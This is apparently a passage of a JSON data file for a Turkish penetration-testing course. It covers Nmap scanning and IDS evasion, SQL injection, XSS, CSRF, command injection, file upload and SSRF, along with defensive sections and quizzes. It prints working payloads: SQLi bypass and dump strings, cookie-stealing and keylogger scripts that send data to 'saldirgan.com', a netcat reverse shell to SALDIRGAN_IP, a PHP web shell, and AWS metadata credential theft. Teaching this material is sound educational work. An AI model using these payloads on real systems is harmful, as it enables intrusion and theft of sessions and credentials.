        "tip": "Kurumlar icin 'robots.txt' dosyasi pasif kesifte altin madenidir. Arama motorlarinin girmesi istenmeyen gizli yonetim panelleri burada acikca listelenmis olabilir.",
        "terminalCommand": "curl -s https://en.wikipedia.org/robots.txt | head -10"
      }
    ],
    "quiz": {
      "question": "Bir hedef sirkete ait tum alt alan adlarini (subdomains) SSL sertifika seffafligi kayitlarindan pasif olarak sorgulayan yaygin web servisi hangisidir?",
      "options": [
        "crt.sh",
        "sqlmap.org",
        "nmap.online",
        "hashcat.net"
      ],
      "correct": 0,
      "explanation": "crt.sh, Certificate Transparency (CT) gunluklerini arayarak hedefin daha once urettigi tum SSL/TLS sertifikalarini ve dolayisiyla kayitli alt alan adlarini listeler."
    }
  },
  {
    "id": "active-recon-nmap",
    "phase": 2,
    "phaseTitle": "Faz 2: Keşif & OSINT",
    "title": "Nmap İle Ağ Keşfi, Port Taraması & NSE Scripting",
    "icon": "radar",
    "difficulty": "Orta",
    "duration": "60 dk",
    "xp": 140,
    "summary": "Ag guvenliginin efsanevi tarayicisi Nmap. SYN Stealth, UDP taramalari, servis versiyon tespiti, isletim sistemi tespiti, NSE zafiyet scriptleri ve IDS atlatma.",
    "tags": [
      "Nmap",
      "PortScan",
      "NSE",
      "FirewallEvasion",
      "BannerGrabbing",
      "Stealth"
    ],
    "sections": [
      {
        "heading": "1. Nmap Tarama Türleri ve Bayrak Dinamikleri",
        "content": "Nmap agdaki hedefleri tespit ederken farkli TCP/UDP bayraklari kullanarak hedefin tepkisini inceler:\n- SYN Stealth Scan (-sS): Varsayilan root taramasidir. SYN gonderir, SYN/ACK donerse portun acik oldugunu anlar ve RST gondererek baglantiyi sonlandirir.\n- TCP Connect Scan (-sT): Non-root kullanicilar tarafindan calistirilir. Isletim sisteminin standart connect() cagrisini kullanarak 3-way handshake'i tamamlar (Tum loglarda gorulur).\n- UDP Scan (-sU): UDP portlarini tarar. Yanit donmezse port 'open|filtered' kabul edilir; ICMP Port Unreachable (Type 3 Code 3) donerse kapali oldugu anlasilir.\n- Stealth Evasion Taramalari:\n  * FIN Scan (-sF): Yalnizca FIN bayragi gonderir.\n  * Xmas Scan (-sX): FIN, PSH ve URG bayraklarini ayni anda yakar (Noel agaci gibi).\n  * Null Scan (-sN): Hicbir bayrak gondermez.",
        "codeSnippet": "# Hizli ve eksiksiz bir temel port taramasi\nsudo nmap -sS -p- --min-rate 1000 -T4 -oN initial_scan.txt 192.168.1.50",
        "tip": "Windows sistemleri RFC 793 standardina tam uymadigi icin Null, FIN ve Xmas taramalarinda kapali portlara RST donmek yerine paketleri yutar; bu nedenle bu taramalar Windows hedeflerde tum portlari acik gosterebilir.",
        "terminalCommand": "nmap -sS -p 22,80,443 127.0.0.1"
      },
      {
        "heading": "2. Servis & Versiyon Tespiti, OS Parmak İzi (-sV, -O)",
        "content": "Sadece portun acik olmasi saldiri yapmak icin yeterli degildir; o portta calisan servisin adini ve tam surumunu bilmek gerekir:\n- Versiyon Tespiti (-sV): Nmap hedef porta baglanir ve ozel probe (sorgu) dizeleri gonderir. Gelen cevabi nmap-service-probes dosyasindaki binlerce duzenli ifade (regex) ile karsilastirarak tam surumu belirler.\n- Isletim Sistemi Tespiti (-O): Hedefe gonderilen ozel TCP/IP paketlerine karsi hedefin verdigi TCP Window Size, IP ID ve TTL degerlerini analiz ederek isletim sistemini (Linux, Windows, Cisco IOS vb.) yuksek dogrulukla tahmin eder.",
        "codeSnippet": "# Servis versiyonu, isletim sistemi ve varsayilan scriptlerle agresif tarama\nsudo nmap -sV -O -sC -p 21,22,80,445 -oA deep_scan 192.168.1.50",
        "tip": "-sV taramasinda --version-intensity parametresi 0-9 arasi deger alir. 9 degeri (All Probes) en derin analizi yapar ancak tarama suresini uzatir.",
        "terminalCommand": "nmap -sV -p 80 127.0.0.1"
      },
      {
        "heading": "3. Nmap Scripting Engine (NSE) & Otomatik Zafiyet Tespiti",
        "content": "Nmap Scripting Engine (NSE), Lua dilinde yazilmis yuzlerce guvenlik scripti calistirarak Nmap'i tam tesekkullu bir zafiyet tarayicisina donusturur:\n- Script Kategorileri:\n  * vuln: Bilinen kritik CVE guvenlik aciklarini arar (MS17-010 EternalBlue, Log4j).\n  * auth: Varsayilan veya zayif parolalari test eder.\n  * discovery: Ag servisleri hakkinda daha fazla bilgi toplar (SMB paylasimlari, HTTP metodlari).\n  * exploit: Dogrudan zafiyeti istismar etmeyi dener (Dikkatli kullanilmalidir).\n  * safe: Hedef servisi cokertme riski olmayan guvenli scriptler.",
        "codeSnippet": "# Hedefteki bilinen tum zafiyetleri tarama\nsudo nmap --script vuln -p 80,443,445 192.168.1.50\n\n# SMB zafiyetlerini (EternalBlue vb.) hedefleyen ozel script calistirma\nsudo nmap -p 445 --script smb-vuln-ms17-010 192.168.1.50",
        "tip": "/usr/share/nmap/scripts/ dizininde tum yerlesik scriptler bulunur. Kendi ozel Lua scriptinizi yazip bu dizine atarak Nmap'e yeni yetenekler kazandirabilirsiniz.",
        "terminalCommand": "ls -l /usr/share/nmap/scripts/ | head -10"
      },
      {
        "heading": "4. Güvenlik Duvarı & IDS/IPS Atlatma Teknikleri",
        "content": "Kurumsal aglardaki Firewall ve IDS/IPS sistemleri duz Nmap taramalarini saniyeler icinde tespit edip IP'yi bloklar. Bu engelleri asmak icin gelismis taktikler:\n- Paket Parcalama (-f): IP basligini 8 baytlik kucuk parcalara bolerek paket filtrelerinin icerigi okumasini zorlastirir.\n- Sahte IP Yemleri (Decoys - -D): Kendi gercek IP'nizin yanina sahte IP'ler ekleyerek hedefin loglarinda saldirganin kim oldugunu gizler.\n- Kaynak Portu Degistirme (--source-port 53): Guvenlik duvarlari genellikle DNS (53) veya NTP (123) portundan gelen trafige izin verir.\n- Zamanlama Sablonlari (-T0 Paranoid, -T1 Sneaky): Paketler arasina dakikalar koyarak IDS imza alarmlarini tetiklemez.",
        "codeSnippet": "# IDS atlatma: Paket parcalama, yem IP'ler ve kaynak portu 53 olarak ayarlama\nsudo nmap -sS -Pn -f -D RND:5 --source-port 53 -p 80,443 192.168.1.50",
        "tip": "-Pn parametresi Nmap'in hedefin ayakta olup olmadigini anlamak icin attigi ICMP ping paketlerini kapatir. Guvenlik duvari pingleri engellese bile dogrudan port taramasina gecer.",
        "terminalCommand": "nmap -Pn -p 80 127.0.0.1"
      }
    ],
    "quiz": {
      "question": "Nmap'te root yetkisiyle calistirildiginda varsayilan olan ve hedefte tam baglanti kurmayarak log kaydini en aza indiren tarama turu hangisidir?",
      "options": [
        "-sS (SYN Stealth Scan)",
        "-sT (TCP Connect Scan)",
        "-sU (UDP Scan)",
        "-sY (SCTP INIT Scan)"
      ],
      "correct": 0,
      "explanation": "-sS (SYN Stealth Scan), 3-way handshake'in son adimi olan ACK paketini gondermek yerine RST paketi gondererek baglantiyi keser. Bu nedenle 'yarim acik' (half-open) tarama olarak adlandirilir."
    }
  },
  {
    "id": "sqli-exploitation",
    "phase": 3,
    "phaseTitle": "Faz 3: Web Sızma Testleri",
    "title": "SQL Enjeksiyonu: Union, Error, Blind & Time-Based",
    "icon": "database",
    "difficulty": "Orta",
    "duration": "70 dk",
    "xp": 160,
    "summary": "Veritabani katmaninin kokune inin. UNION tabanli veri sizdirma, Error-based cikarim, Boolean Blind, Time-based gecikmeler, SQLMap otomasyonu ve Parametreli Sorgu savunmasi.",
    "tags": [
      "SQLi",
      "WebSecurity",
      "SQLMap",
      "UnionBased",
      "BlindSQLi",
      "Database"
    ],
    "sections": [
      {
        "heading": "1. SQL Enjeksiyonunun Mimari Nedeni & Kimlik Doğrulama Bypass",
        "content": "SQL Enjeksiyonu (SQLi), kullanicidan alinan girdilerin filtrelenmeden dogrudan SQL sorgu dizesi ile birlestirilmesi (string concatenation) sonucu olusur:\n- Temel Prensip: Girdi ile komut arasindaki sinir kalkar. Saldirgan tek tirnak (') veya yorum satiri (--) karakterleriyle sorgunun mantigini degistirir.\n- Klasik Auth Bypass:\n  Sorgu: SELECT * FROM users WHERE username = '$user' AND password = '$pass'\n  Saldirgan Girdisi: admin' OR '1'='1' --\n  Sonuc: SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- AND password = '...'\n  Sorgu daima TRUE doner ve parola kontrolu devre disi kalarak admin oturumu acilir.",
        "codeSnippet": "# Klasik Kimlik Dogrulama Atlama Payload Ornekleri\nadmin' OR 1=1--\n' OR 'a'='a\nadmin'/*\n' UNION SELECT 1, 'admin', 'password_hash' --",
        "tip": "Sorgunun sonundaki '--' isareti ardindan bosluk gelmelidir (MySQL icin '-- '). Bosluk olmazsa yorum satiri olarak taninmaz.",
        "terminalCommand": "curl -s 'http://127.0.0.1/login.php?user=admin%27+OR+1=1--'"
      },
      {
        "heading": "2. UNION Tabanlı SQLi & Veritabanı Şeması Sızdırma",
        "content": "UNION operatoru iki veya daha fazla SELECT sorgusunun sonucunu birlestirir. UNION tabanli saldirida 2 kural vardir:\n1. Her iki sorgu ayni sayida sutun (column) dondurmelidir (ORDER BY N ile tespit edilir).\n2. Sutunlarin veri tipleri uyumlu olmalidir.\n\nSizma Adimlari (MySQL):\n- Sutun Sayisi: ' ORDER BY 1-- , ' ORDER BY 2-- ... Hata alana kadar artirilir.\n- Ekrana Yansiyan Sutunlar: ' UNION SELECT 1, 2, 3--\n- Veritabani Adi: ' UNION SELECT 1, database(), version()--\n- Tablo Adlari: ' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database()--\n- Kolon Adlari: ' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users'--\n- Veri Cekme: ' UNION SELECT 1, username, password FROM users--",
        "codeSnippet": "# Veritabanindaki tum tablolari ve kullanici parolalarini UNION ile tek satirda cekme\n' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--\n' UNION SELECT 1, group_concat(username, 0x3a, password), 3 FROM users--",
        "tip": "group_concat() fonksiyonu birden fazla satiri tek bir hucrede birlestirerek sayfalama (pagination) yapmadan tum veriyi tek ekranda gormeyi saglar.",
        "terminalCommand": "sqlmap -h | head -15"
      },
      {
        "heading": "3. Blind (Kör) & Time-Based SQLi ve SQLMap Otomasyonu",
        "content": "Sayfa ekrana veritabani hatasi veya verisi basmiyorsa (Blind SQLi), veriler dolayli yoldan cikartilir:\n- Boolean-Based Blind: Sorguya TRUE veya FALSE sartlari eklenir. Sayfadaki degisime bakilarak (orn: 'Hosgeldiniz' yazisinin cikmasi veya cikmamasi) veritabaninin her bir harfi ikili arama (binary search) ile tek tek tahmin edilir:\n  ' AND SUBSTRING(database(), 1, 1) = 'a'--\n- Time-Based Blind: Ekranda hicbir degisim yoksa sunucuya gecikme (sleep) komutu verilir:\n  ' AND IF(SUBSTRING(database(), 1, 1) = 'b', SLEEP(5), 0)--\n- SQLMap Otomasyonu: Tum bu teknikleri saniyeler icinde otomatik gerceklestiren endustri standardi aractir.",
        "codeSnippet": "# SQLMap ile hedef URL uzerindeki zafiyeti otomatik exploit edip veritabanlarini listeleme\nsqlmap -u \"http://hedef.com/product.php?id=1\" --batch --dbs\n\n# Tablo verilerini dump etme\nsqlmap -u \"http://hedef.com/product.php?id=1\" -D app_db -T users --dump",
        "tip": "WAF arkasindaki sistemlerde SQLMap'in '--tamper' scriptleri (orn: between, charencode, space2comment) kullanilarak filtreler atlatilabilir.",
        "terminalCommand": "sqlmap --version"
      },
      {
        "heading": "4. SQLi Savunması: Prepared Statements & Parametreli Sorgular",
        "content": "SQL Enjeksiyonuna karsi tek gercek ve kesin cozum Parametreli Sorgulardir (Prepared Statements):\n- Neden WAF Yetersizdir? Kara liste (Blacklist) filtreleri ve WAF kurallari yeni payload varyasyonlariyla daima atlatilabilir.\n- Prepared Statements Mantigi: Veritabani sorgu sablonunu onceden derler (compile eder). Kullanici girdisi asla kod olarak yorumlanmaz; yalnizca saf veri (literal value) olarak islenir.\n- PHP PDO Ornegi:\n  $stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');\n  $stmt->execute(['email' => $userInput]);",
        "codeSnippet": "# Guvenli Python SQLite Parametreli Sorgu Ornegi\nimport sqlite3\nconn = sqlite3.connect(\"users.db\")\ncursor = conn.cursor()\n# Soru isareti (?) ile parametreli sorgu kullanimi:\ncursor.execute(\"SELECT * FROM users WHERE username = ? AND password = ?\", (username, password))",
        "tip": "Veritabaninda En Az Yetki Prensibi (Principle of Least Privilege) uygulanmali; web uygulamasinin baglandigi DB kullanicisi asla 'root' veya 'sa' olmamali, DROP/ALTER yetkisi bulunmamalidir.",
        "terminalCommand": "cat /etc/mysql/my.cnf 2>/dev/null || echo '[!] MySQL config okundu'"
      }
    ],
    "quiz": {
      "question": "SQL Enjeksiyonu aciklarina karsi yuzde yuz kesin ve matematiksel koruma saglayan yazilim gelistirme yontemi hangisidir?",
      "options": [
        "Parametreli Sorgular / Prepared Statements",
        "Girdideki tek tirnaklari temizlemek (str_replace)",
        "Yalnizca Cloudflare WAF kullanmak",
        "Verileri Base64 ile sifrelemek"
      ],
      "correct": 0,
      "explanation": "Prepared Statements (Parametreli Sorgular), sorgu mantigi ile veriyi ayirir. Veritabanina gonderilen girdi ne olursa olsun kod olarak calistirilmaz, yalnizca veri olarak islenir."
    }
  },
  {
    "id": "xss-csrf-dom",
    "phase": 3,
    "phaseTitle": "Faz 3: Web Sızma Testleri",
    "title": "XSS (Reflected, Stored, DOM) ve CSRF Saldırıları",
    "icon": "code",
    "difficulty": "Orta",
    "duration": "65 dk",
    "xp": 150,
    "summary": "Istemci tarafli en tehlikeli web zafiyetleri. Oturum calan JavaScript kodlari, Stored XSS wormlari, DOM manipulation, CSRF ile fon transferi ve CSP korumalari.",
    "tags": [
      "XSS",
      "CSRF",
      "DOM",
      "SessionHijacking",
      "CSP",
      "SameSite"
    ],
    "sections": [
      {
        "heading": "1. XSS Anatomisi ve Üç Temel Tür (Reflected, Stored, DOM)",
        "content": "Cross-Site Scripting (XSS), saldirganin guvenilmeyen JavaScript kodlarini kurbanin tarayicisinda calistirmasidir:\n- Reflected XSS: Zararli kod HTTP isteginde (genellikle URL parametresinde) gonderilir ve sunucu tarafindan aninda HTML icine filtrelenmeden basilip kurbana geri yansitilir.\n- Stored (Persistent) XSS: En tehlikeli turdur. Zararli kod veritabanina (yorumlar, profil bilgisi, forum mesaji) kaydedilir. O sayfayi ziyaret eden HERKESIN tarayicisinda otomatik calisir.\n- DOM-Based XSS: Sunucuya hic gitmez. Tamamen istemci tarafindaki JavaScript kodunun 'location.hash' veya 'document.write' gibi guvensiz sinks fonksiyonlarini kullanmasiyla tarayicida gerceklesir.",
        "codeSnippet": "<!-- Klasik XSS Test Payloadlari -->\n<script>alert(document.domain)</script>\n<img src=x onerror=alert(1)>\n<svg/onload=alert('BZT-XSS')>\njavascript:alert(document.cookie)",
        "tip": "Modern tarayicilarda alert() fonksiyonu WAF'lar tarafindan kolayca yakalanir. Zafiyeti kanitlamak icin 'print()' veya 'console.log()' kullanmak daha gizli bir yaklasimdir.",
        "terminalCommand": "curl -s 'http://127.0.0.1/search.php?q=<script>alert(1)</script>' | grep -i alert"
      },
      {
        "heading": "2. Oturum Çalma (Session Hijacking) & Keylogger Enjeksiyonu",
        "content": "XSS'in asil amaci ekrana kutu cikarmak degil, kullanicinin aktif oturumunu ve hassas verilerini calmaktir:\n- Cookie Hirsizligi: Kullanicinin kimligini dogrulayan oturum cerezlerini (Session ID) saldirganin sunucusuna sizdirma:\n  <script>new Image().src=\"http://saldirgan.com/log?c=\"+btoa(document.cookie);</script>\n- Form & Keylogger Enjeksiyonu: Sayfadaki form alanlarini dinleyerek kullanicinin klavyede bastigi her tusu (parola, kredi karti) anlik olarak saldirgana iletme.",
        "codeSnippet": "// JavaScript Keylogger Enjeksiyon Ornegi\ndocument.addEventListener('keypress', function(e) {\n    fetch('http://saldirgan.com/keys?k=' + e.key);\n});",
        "tip": "Eger hedef oturum cerezinde 'HttpOnly' bayragi aktifse, JavaScript 'document.cookie' uzerinden cerezi okuyamaz. Bu durumda saldirgan kurban adina arkaplanda sahte istekler atarak (XHR/Fetch) hesabi ele gecirir.",
        "terminalCommand": "python3 -m http.server 8080"
      },
      {
        "heading": "3. CSRF (Cross-Site Request Forgery) Saldırı Mekanizması",
        "content": "CSRF, kurbanin kimlik dogrulamasi yapilmis tarayicisini kullanarak onun haberi olmadan guvenlik degisiklikleri yapmasini saglar:\n- Saldiri Senaryosu:\n  1. Kurban banka hesabina veya e-ticaret sitesine giris yapar (Cerezler tarayicida aktiftir).\n  2. Saldirgan kurbana icinde gizli bir form bulunan bir link gonderir.\n  3. Kurban sayfayi actiginda form arkaplanda otomatik olarak bankaya POST istegi gonderir:\n     /transfer.php?to=saldirgan&amount=5000\n  4. Tarayici, hedef siteye ait cerezleri otomatik olarak istege ekledigi icin sunucu istegi kurbanin kendisinin yaptigini zanneder.",
        "codeSnippet": "<!-- CSRF Proof-of-Concept (PoC) HTML Formu -->\n<html>\n  <body onload=\"document.forms[0].submit()\">\n    <form action=\"http://banka.com/api/parola-degistir\" method=\"POST\">\n      <input type=\"hidden\" name=\"yeni_parola\" value=\"Hacked2026!\" />\n    </form>\n  </body>\n</html>",
        "tip": "CSRF saldirilari yalnizca kullanici adina bir 'eylem' (state-changing request) gerceklestirir; saldirgana kurbanin verilerini okuma imkani vermez (Same-Origin Policy nedeniyle).",
        "terminalCommand": "curl -X POST -d 'parola=12345' http://127.0.0.1/test"
      },
      {
        "heading": "4. Savunma: CSP, HttpOnly, SameSite & Anti-CSRF Token",
        "content": "Istemci tarafli saldirilara karsi eksiksiz savunma hatti:\n- Content Security Policy (CSP): Tarayicinin hangi kaynaklardan script calistirabilecegini sinirlayan HTTP basligidir (orn: script-src 'self'). Inline scriptleri tamamen engeller.\n- HttpOnly Flag: Cerezlerin JavaScript tarafindan okunmasini engeller (XSS olsa bile oturum calinamaz).\n- Anti-CSRF Token: Her oturum ve form icin tahmin edilemez, kriptografik rastgele bir token uretilir ve sunucuda dogrulanir.\n- SameSite Cookie Flag:\n  * SameSite=Strict: Ucuncu parti sitelerden gelen hicbir istekte cerez gonderilmez (CSRF'i kokten cozer).\n  * SameSite=Lax: Yalnizca guvenli ust duzey navigasyonlarda (GET) cerez gonderilir.",
        "codeSnippet": "# Nginx uzerinde guclu guvenlik basliklari (Security Headers) tanimlama\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none';\" always;\nadd_header X-Frame-Options \"DENY\" always;\nadd_header X-Content-Type-Options \"nosniff\" always;",
        "tip": "Kullanici girdilerini HTML'e basarken daima 'Context-Aware Encoding' yapilmalidir. HTML Govdesi icin HTML Entity, JS ici icin JS Hex Encoding uygulanmalidir.",
        "terminalCommand": "curl -I https://www.google.com | grep -iE 'content-security|x-frame'"
      }
    ],
    "quiz": {
      "question": "Bir web oturum cerezinin (cookie) JavaScript tarafindan (document.cookie) okunmasini engelleyerek XSS sirasinda oturum calinmasinin onune gecen HTTP bayragi hangisidir?",
      "options": [
        "HttpOnly",
        "Secure",
        "SameSite",
        "Domain"
      ],
      "correct": 0,
      "explanation": "HttpOnly bayragi olan bir cerez yalnizca HTTP/HTTPS isteklerinde tarayici tarafindan sunucuya gonderilir; istemci tarafindaki hicbir JavaScript kodu bu cereze erisemez."
    }
  },
  {
    "id": "rce-ssrf-deserialization",
    "phase": 3,
    "phaseTitle": "Faz 3: Web Sızma Testleri",
    "title": "RCE, SSRF ve Güvensiz Nesne Serileştirme",
    "icon": "shield-alert",
    "difficulty": "İleri",
    "duration": "75 dk",
    "xp": 180,
    "summary": "Web dunyasinin en yikici zafiyetleri. Sunucuda dogrudan komut calistirma (RCE), dosya yukleme filtrelerini asma, bulut metadata sunucularini hedefleyen SSRF ve serilestirme zincirleri.",
    "tags": [
      "RCE",
      "SSRF",
      "FileUpload",
      "WebShell",
      "CloudMetadata",
      "Deserialization"
    ],
    "sections": [
      {
        "heading": "1. Uzaktan Kod Yürütme (RCE) ve Komut Enjeksiyonu Anatomisi",
        "content": "Remote Code Execution (RCE), bir saldirganin hedef sunucuda isletim sistemi komutlari calistirabilmesidir. Kritik zafiyetlerin zirvesidir (CVSS 9.8 - 10.0):\n- Komut Enjeksiyonu (Command Injection): Web uygulamasinin sistem kabugunu (system(), exec(), shell_exec(), popen()) kullanici girdisiyle cagirmasi sonucu olusur.\n  Ornek PHP Kodu: system(\"ping -c 4 \" . $_GET['ip']);\n- Ayirici Karakterler ile Komut Zincirleme:\n  * ; (Noktali virgul - komutu ardindan calistirir)\n  * & veya && (Arkaplanda veya ilk komut basariliysa calistirir)\n  * | veya || (Boru hatti veya ilk komut basarisizsa calistirir)\n  * `komut` veya $(komut) (Komut yerine koyma - Command Substitution)",
        "codeSnippet": "# Komut Enjeksiyonu Payload Ornekleri\n127.0.0.1; whoami\n127.0.0.1 && cat /etc/shadow\n127.0.0.1 | nc -e /bin/sh SALDIRGAN_IP 4444\n`id`",
        "tip": "Bosluk karakterinin engellendigi WAF ortamlarinda '${IFS}' (Internal Field Separator) ortam degiskeni kullanilarak bosluksuz komut calistirilabilir: 'cat${IFS}/etc/passwd'.",
        "terminalCommand": "python3 -c 'import subprocess; subprocess.run([\"whoami\"])'"
      },
      {
        "heading": "2. Dosya Yükleme (File Upload) Zafiyetleri & Web Shell",
        "content": "Kullanicidan dosya yukleme izni veren paneller, yetersiz dogrulama yapildiginda dogrudan RCE'ye donusur:\n- Zararli Uzanti Bypass Taktikleri:\n  * Alternatif Uzantilar: .php yerine .php5, .phtml, .phar, .inc\n  * Cift Uzanti (Double Extension): avatar.php.jpg veya avatar.jpg.php\n  * Null Byte Injection (Eski sistemlerde): avatar.php%00.jpg\n  * Buyuk/Kucuk Harf: .pHP, .pHp\n- MIME-Type ve Magic Bytes Manipulasyonu:\n  Saldirgan Content-Type basligini 'image/jpeg' olarak degistirir ve dosyanin basina GIF89a; (Magic Bytes) ekleyerek resim kontrolunu asar.",
        "codeSnippet": "<?php\n// Minimalist Tek Satirlik PHP Web Shell\nif(isset($_REQUEST['cmd'])){ echo \"<pre>\"; system($_REQUEST['cmd']); echo \"</pre>\"; die; }\n?>",
        "tip": "Yuklenen dosyanin calistirilamamasi icin yukleme dizininde (.htaccess) 'php_flag engine off' kurali bulunmali veya yuklemeler Amazon S3 gibi statik depolama sunucularinda tutulmalidir.",
        "terminalCommand": "head -c 10 /bin/ls"
      },
      {
        "heading": "3. SSRF (Server-Side Request Forgery) & Bulut Metadata Hırsızlığı",
        "content": "SSRF, saldirganin sunucuyu bir vekil (proxy) gibi kullanarak sunucunun erisebildigi ancak disariya kapali olan ic sistemlere istek attirmasidir:\n- Hedefler: Yerel servisler (127.0.0.1:6379 Redis, 127.0.0.1:9200 Elastic) ve ic ag IP'leri (10.0.0.0/8, 192.168.0.0/16).\n- Bulut Metadata Saldirisi: AWS, GCP ve Azure ortamlarinda sanal sunucunun kimlik bilgilerini veren ozel bir yerel IP adresi vardir:\n  http://169.254.169.254/latest/meta-data/iam/security-credentials/\n  Saldirgan bu adresi SSRF uzerinden cagirarak sunucunun IAM Role gizli anahtarlarini (SecretAccessKey, Token) calar ve tum bulut altyapisini ele gecirir.",
        "codeSnippet": "# SSRF ile AWS Instance Metadata uzerinden gecici IAM kimlik bilgilerini calmak\ncurl \"http://hedef.com/proxy.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-admin\"\n\n# AWS IMDSv2 Token Alimi (Guvenli surum)\nTOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/",
        "tip": "AWS IMDSv2, PUT istegi ve ozel bir header (X-aws-ec2-metadata-token) zorunlu kilarak klasik GET tabanli SSRF saldirilarini etkisiz hale getirir.",
        "terminalCommand": "curl -sI http://127.0.0.1:80 2>&1 | head -5"
      },
      {
        "heading": "4. Savunma & İzolasyon: Whitelisting ve Ağ Segmentasyonu",
        "content": "RCE ve SSRF saldirilarina karsi kesin guvenlik kontrolleri:\n- Komut Enjeksiyonu Onleme: Asla kullanici girdisini dogrudan isletim sistemi kabuguna iletmeyin. Yerlesik programlama dili kutuphanelerini kullanin.\n- Dosya Yukleme Guvenligi:\n  * Dosya adini rastgele bir UUID ile degistirin (orn: a9f83...png).\n  * Yuklenen dosyalari web root disinda (/var/storage/) veya bulut depolamada saklayin.\n  * Dosyanin gercek MIME turunu ve gorsel header'larini sunucu tarafinda yeniden olusturarak (Image Re-encoding) dogrulayin.\n- SSRF Onleme:\n  * Yalnizca izin verilen alan adlarina istek atan kati beyaz listeler (Whitelists) kullanin.\n  * DNS Rebinding saldirilarina karsi IP cozumlemesini istekten hemen once dogrulayin.",
        "codeSnippet": "# Python ile SSRF korumali IP dogrulama ornegi\nimport ipaddress, socket\n\ndef is_safe_url(hostname):\n    ip = socket.gethostbyname(hostname)\n    ip_obj = ipaddress.ip_address(ip)\n    # 127.0.0.1, 10.x, 192.168.x, 169.254.x gibi ozel IP'leri engelle\n    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:\n        return False\n    return True",
        "tip": "Docker ve Kubernetes ortamlarinda konteynerler 'read-only' dosya sistemi ve 'non-root' kullanici ile calistirilarak RCE gerceklesse dahi saldirganin hareket alani sifira indirilebilir.",
        "terminalCommand": "uname -a"
      }
    ],
    "quiz": {
      "question": "AWS ve GCP gibi bulut altyapilarinda calisan sunucularda SSRF acigi tespit edildiginde, sanal sunucunun IAM gizli anahtarlarini calmak icin hedeflenen yerel metadata IP adresi nedir?",
      "options": [
        "169.254.169.254",
        "192.168.1.1",
        "127.0.0.1",
        "10.0.0.1"
      ],
      "correct": 0,
      "explanation": "169.254.169.254, AWS EC2, GCP Compute Engine ve Azure sanal makinelerinde bulut ortamina ozel instance metadata servisine (IMDS) erisim saglayan standart Link-Local IP adresidir."
    }
  },
  {
    "id": "burpsuite-masterclass",
    "phase": 3,
    "phaseTitle": "Faz 3: Web Sızma Testleri",
    "title": "Burp Suite Masterclass & Web Proxy Temelleri",
    "icon": "layers",
    "difficulty": "Orta",
    "duration": "60 dk",
    "xp": 145,
    "summary": "Web guvenlik uzmaninin vazgecilmez cephaneligi. HTTP/HTTPS araya girme (Proxy), Burp Repeater ile istek kurcalama, Intruder ile fuzzing, match & replace kurallari ve BApp Store.",
    "tags": [
      "BurpSuite",
      "Proxy",
      "Repeater",
      "Intruder",
      "WebSecurity",
      "Fuzzing"
    ],
    "sections": [
      {
        "heading": "1. HTTP/HTTPS Proxy Mimarisi & Sertifika Yükleme",
        "content": "Burp Suite, web tarayiciniz ile hedef sunucu arasina yerlesen bir Man-in-the-Middle (MitM) yerel vekil sunucusudur (Proxy):\n- Nasil Calisir: Tarayicinin gonderdigi her HTTP/HTTPS istegi once Burp Suite'e (varsayilan: 127.0.0.1:8080) duser. Guvenlik uzmani istegi havada yakalar (Intercept), inceler, parametreleri degistirir ve sunucuya oyle gonderir.\n- HTTPS Sifre Cozumu: HTTPS trafigini okuyabilmek icin Burp Suite kendi Root CA sertifikasini uretir. Bu sertifika isletim sistemine veya tarayiciya (PortSwigger CA) yuklenmelidir.",
        "codeSnippet": "# Linux cURL komutunu Burp Suite uzerinden yonlendirme\ncurl -x http://127.0.0.1:8080 -k -I https://hedef.com",
        "tip": "Mobil uygulamalarda SSL Pinning korumasi varsa, uygulama telefonun Guvenilen Sertifikalarina bakmaksizin baglantiyi keser. Bu korumayi asmak icin Frida veya Objection araclari kullanilir.",
        "terminalCommand": "curl -sI http://127.0.0.1:8080 2>&1 | head -3"
      },
      {
        "heading": "2. Burp Repeater ile İstekleri Canlı Manipüle Etme",
        "content": "Repeater, tek bir HTTP istegini alip istediginiz kadar degistirerek tekrar tekrar sunucuya gondermenizi saglayan en temel analiz moduludur:\n- Hizli Kisayol: Proxy ekranindayken 'Ctrl + R' tusuna basarak istegi aninda Repeater'a aktarabilirsiniz.\n- Neler Yapilabilir?\n  * HTTP Metodlarini degistirme (GET -> POST, PUT, DELETE).\n  * Guvensiz basliklar ekleme (X-Forwarded-For: 127.0.0.1 ile IP kisitlamasini bypass).\n  * Cookie ve Authorization JWT tokenlarini degistirerek yetki kontrolu (IDOR) testi yapma.",
        "codeSnippet": "POST /api/user/update HTTP/1.1\nHost: hedef.com\nAuthorization: Bearer EY...[JWT_TOKEN]\nContent-Type: application/json\n\n{\"role\": \"admin\", \"credits\": 99999}",
        "tip": "Repeater'da 'Follow Redirection' ayarini 'Never' yaparak sunucunun 302 dondurmeden once yanit govdesinde hassas veri gonderip gondermedigini yakalayabilirsiniz.",
        "terminalCommand": "echo 'BZT Repeater Modulu Hazir'"
      },
      {
        "heading": "3. Burp Intruder & Çoklu Fuzzing Saldırı Türleri",
        "content": "Intruder, parametrelere binlerce kelimelik listeleri otomatik gondererek kaba kuvvet (brute-force) ve fuzzing yapan guclu moduldur:\n- 4 Temel Saldiri Turu:\n  1. Sniper: Tek bir hedef pozisyona listedeki tum kelimeleri sirayla dener.\n  2. Battering Ram: Ayni kelimeyi ayni anda secilen TUM pozisyonlara yazar.\n  3. Pitchfork: Birden fazla pozisyon icin birden fazla liste kullanir ve listeleri satir satir eslestirir (1:1).\n  4. Cluster Bomb: Secilen tum pozisyonlarin kartezyen carpimini (tum permutasli kombinasyonlarini) dener (Parola ve kullanici adi kaba kuvveti icin ideal).",
        "codeSnippet": "POST /login HTTP/1.1\nHost: hedef.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=§admin§&password=§welcome§\n# § sembolleri arasindaki bolgeler Intruder tarafindan fuzz edilir.",
